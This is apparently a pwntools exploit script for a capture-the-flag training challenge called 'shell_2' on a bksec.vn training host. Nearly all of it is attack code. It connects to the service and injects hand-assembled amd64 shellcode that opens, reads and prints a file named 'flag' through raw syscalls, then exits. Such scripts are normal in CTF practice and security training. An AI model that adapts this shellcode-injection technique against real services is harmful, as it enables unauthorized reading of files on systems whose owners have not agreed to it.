#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-shell-2-005a46479455.training.bksec.vn"
elf = context.binary = ELF('./shell_2', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001542
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

sc = asm('''
	mov rbx, 0x67616c662f
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	mov rax, 2
	syscall

	mov rdi, rax
	sub rsp, 0x100
	mov rsi, rsp
	mov rdx, 0x100
	xor rax, rax
	syscall

	mov rdx, rax
	mov rdi, 1
	mov rax, 1
	syscall

	mov rax, 0x3c
	xor rdi, rdi
	syscall

	''', arch = 'amd64')

# GDB()
sla(b' bytes):\n', sc)

p.interactive()